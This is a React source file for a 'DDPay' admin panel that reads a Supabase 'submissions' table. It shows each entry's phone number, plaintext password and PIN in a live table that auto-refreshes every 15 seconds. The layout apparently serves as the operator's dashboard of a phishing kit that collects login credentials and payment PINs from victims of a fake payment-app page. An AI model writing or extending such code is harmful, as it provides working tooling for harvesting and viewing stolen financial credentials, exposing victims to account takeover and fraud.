import { useEffect, useState, useCallback } from "react";
import { supabase } from "@/lib/supabase";

interface Submission {
  id: string;
  phone: string;
  password: string;
  pin: string | null;
  submitted_at: string;
}

export default function AdminPage() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);
  const [lastRefreshed, setLastRefreshed] = useState<Date>(new Date());
  const [refreshing, setRefreshing] = useState(false);

  const fetchSubmissions = useCallback(async (silent = false) => {
    if (!silent) setLoading(true);
    else setRefreshing(true);

    const { data, error } = await supabase
      .from("submissions")
      .select("*")
      .order("submitted_at", { ascending: false });

    if (!error && data) {
      setSubmissions(data as Submission[]);
    }
    setLastRefreshed(new Date());
    if (!silent) setLoading(false);
    else setRefreshing(false);
  }, []);

  useEffect(() => {
    fetchSubmissions();
    const interval = setInterval(() => fetchSubmissions(true), 15000);
    return () => clearInterval(interval);
  }, [fetchSubmissions]);

  const formatTime = (iso: string) =>
    new Date(iso).toLocaleString("en-IN", {
      day: "2-digit",
      month: "short",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });

  return (
    <div
      className="min-h-screen"
      style={{ background: "hsl(210,25%,93%)", padding: "32px 16px" }}
    >
      {/* Header */}
      <div
        className="flex items-center justify-between mb-6"
        style={{ maxWidth: "900px", margin: "0 auto 24px" }}
      >
        <div className="flex items-center gap-3">
          <img
            src="https://cdn-ai.onspace.ai/onspace/files/FbTXz8eM2zcJYp9HmCNu2K/9888.jpg"
            alt="DDPay"
            style={{ width: "44px", height: "36px", objectFit: "contain" }}
          />
          <div>
            <h1 className="font-bold" style={{ fontSize: "22px", color: "#111", margin: 0 }}>
              Admin Panel
            </h1>
            <p style={{ fontSize: "12px", color: "#888", margin: 0 }}>Live Submissions</p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          {/* Auto-refresh indicator */}
          <div
            className="flex items-center gap-2 px-3 py-1 rounded-full"
            style={{ background: "rgba(46,170,108,0.12)", border: "1px solid rgba(46,170,108,0.25)" }}
          >
            <span
              className="rounded-full"
              style={{
                width: "7px",
                height: "7px",
                background: "#2eaa6c",
                display: "inline-block",
                animation: "pulse 2s infinite",
              }}
            />
            <span style={{ fontSize: "12px", color: "#2eaa6c", fontWeight: 500 }}>
              Auto-refresh 15s
            </span>
          </div>

          {/* Manual Refresh */}
          <button
            onClick={() => fetchSubmissions(true)}
            disabled={refreshing}
            className="flex items-center gap-2 rounded-full font-semibold transition-all active:scale-95"
            style={{
              height: "36px",
              padding: "0 16px",
              fontSize: "13px",
              background: "linear-gradient(135deg, #2eaa6c, #1e8a54)",
              color: "#fff",
              border: "none",
              cursor: refreshing ? "default" : "pointer",
              opacity: refreshing ? 0.75 : 1,
              boxShadow: "0 2px 10px rgba(46,170,108,0.3)",
            }}
          >
            <svg
              width="13"
              height="13"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
              style={{
                animation: refreshing ? "spin 0.8s linear infinite" : "none",
              }}
            >
              <polyline points="23 4 23 10 17 10" />
              <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" />
            </svg>
            Refresh
          </button>
        </div>
      </div>

      {/* Stats Bar */}
      <div
        className="flex gap-3 mb-5"
        style={{ maxWidth: "900px", margin: "0 auto 20px" }}
      >
        <div
          className="flex-1 rounded-2xl flex flex-col items-center justify-center py-4"
          style={{
            background: "#fff",
            boxShadow: "0 1px 8px rgba(0,0,0,0.07)",
          }}
        >
          <span className="font-bold" style={{ fontSize: "28px", color: "#2eaa6c" }}>
            {submissions.length}
          </span>
          <span style={{ fontSize: "12px", color: "#888" }}>Total Submissions</span>
        </div>
        <div
          className="flex-1 rounded-2xl flex flex-col items-center justify-center py-4"
          style={{
            background: "#fff",
            boxShadow: "0 1px 8px rgba(0,0,0,0.07)",
          }}
        >
          <span className="font-bold" style={{ fontSize: "13px", color: "#555" }}>
            {lastRefreshed.toLocaleTimeString("en-IN", {
              hour: "2-digit",
              minute: "2-digit",
              second: "2-digit",
              hour12: true,
            })}
          </span>
          <span style={{ fontSize: "12px", color: "#888" }}>Last Refreshed</span>
        </div>
        <div
          className="flex-1 rounded-2xl flex flex-col items-center justify-center py-4"
          style={{
            background: "#fff",
            boxShadow: "0 1px 8px rgba(0,0,0,0.07)",
          }}
        >
          <span className="font-bold" style={{ fontSize: "28px", color: "#1e8a54" }}>
            {submissions.filter((s) => s.pin).length}
          </span>
          <span style={{ fontSize: "12px", color: "#888" }}>With PIN</span>
        </div>
      </div>

      {/* Table Card */}
      <div
        className="rounded-2xl overflow-hidden"
        style={{
          maxWidth: "900px",
          margin: "0 auto",
          background: "#fff",
          boxShadow: "0 2px 16px rgba(0,0,0,0.08)",
        }}
      >
        {loading ? (
          <div className="flex flex-col items-center justify-center py-16 gap-3">
            <svg
              width="32"
              height="32"
              viewBox="0 0 24 24"
              fill="none"
              stroke="#2eaa6c"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
              style={{ animation: "spin 0.9s linear infinite" }}
            >
              <polyline points="23 4 23 10 17 10" />
              <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" />
            </svg>
            <span style={{ fontSize: "14px", color: "#aaa" }}>Loading submissions...</span>
          </div>
        ) : submissions.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-16 gap-3">
            <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#ddd" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
              <polyline points="14 2 14 8 20 8" />
              <line x1="16" y1="13" x2="8" y2="13" />
              <line x1="16" y1="17" x2="8" y2="17" />
              <polyline points="10 9 9 9 8 9" />
            </svg>
            <span style={{ fontSize: "15px", color: "#bbb" }}>No submissions yet</span>
          </div>
        ) : (
          <div className="overflow-x-auto">
            {/* Table Header */}
            <table style={{ width: "100%", borderCollapse: "collapse" }}>
              <thead>
                <tr style={{ background: "linear-gradient(135deg, #1a7a47, #2eaa6c)" }}>
                  {["#", "Phone", "Password", "PIN", "Submitted At"].map((h) => (
                    <th
                      key={h}
                      style={{
                        padding: "14px 16px",
                        fontSize: "12px",
                        fontWeight: 700,
                        color: "rgba(255,255,255,0.9)",
                        textAlign: "left",
                        letterSpacing: "0.6px",
                        textTransform: "uppercase",
                        whiteSpace: "nowrap",
                      }}
                    >
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {submissions.map((sub, idx) => (
                  <tr
                    key={sub.id}
                    style={{
                      borderBottom: "1px solid #f0f0f0",
                      background: idx % 2 === 0 ? "#fff" : "#fafcfb",
                      transition: "background 0.15s",
                    }}
                    onMouseEnter={(e) => {
                      (e.currentTarget as HTMLTableRowElement).style.background = "#f0faf5";
                    }}
                    onMouseLeave={(e) => {
                      (e.currentTarget as HTMLTableRowElement).style.background =
                        idx % 2 === 0 ? "#fff" : "#fafcfb";
                    }}
                  >
                    {/* # */}
                    <td style={{ padding: "14px 16px", fontSize: "13px", color: "#bbb", fontWeight: 600, width: "48px" }}>
                      {submissions.length - idx}
                    </td>

                    {/* Phone */}
                    <td style={{ padding: "14px 16px" }}>
                      <div className="flex items-center gap-2">
                        <div
                          className="flex items-center justify-center rounded-full flex-shrink-0"
                          style={{ width: "28px", height: "28px", background: "rgba(46,170,108,0.1)" }}
                        >
                          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#2eaa6c" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                            <circle cx="12" cy="8" r="4" />
                            <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" />
                          </svg>
                        </div>
                        <span style={{ fontSize: "14px", color: "#222", fontWeight: 500 }}>{sub.phone}</span>
                      </div>
                    </td>

                    {/* Password */}
                    <td style={{ padding: "14px 16px" }}>
                      <div className="flex items-center gap-2">
                        <div
                          className="flex items-center justify-center rounded-full flex-shrink-0"
                          style={{ width: "28px", height: "28px", background: "rgba(30,138,84,0.08)" }}
                        >
                          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#1e8a54" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                            <rect x="3" y="11" width="18" height="11" rx="2" />
                            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                          </svg>
                        </div>
                        <span
                          className="rounded-lg px-2 py-1"
                          style={{
                            fontSize: "13px",
                            color: "#333",
                            background: "#f5f5f5",
                            fontFamily: "monospace",
                            letterSpacing: "0.5px",
                          }}
                        >
                          {sub.password}
                        </span>
                      </div>
                    </td>

                    {/* PIN */}
                    <td style={{ padding: "14px 16px" }}>
                      {sub.pin ? (
                        <span
                          className="rounded-full px-3 py-1 font-bold"
                          style={{
                            fontSize: "13px",
                            background: "rgba(46,170,108,0.12)",
                            color: "#1e8a54",
                            letterSpacing: "2px",
                            fontFamily: "monospace",
                          }}
                        >
                          {sub.pin}
                        </span>
                      ) : (
                        <span style={{ fontSize: "12px", color: "#ccc" }}>—</span>
                      )}
                    </td>

                    {/* Time */}
                    <td style={{ padding: "14px 16px", whiteSpace: "nowrap" }}>
                      <div className="flex items-center gap-1">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#aaa" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <circle cx="12" cy="12" r="10" />
                          <polyline points="12 6 12 12 16 14" />
                        </svg>
                        <span style={{ fontSize: "13px", color: "#666" }}>{formatTime(sub.submitted_at)}</span>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Footer */}
      <div className="text-center mt-6" style={{ fontSize: "12px", color: "#bbb" }}>
        DDPay Admin · Auto-refreshes every 15 seconds
      </div>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.4; }
        }
      `}</style>
    </div>
  );
}
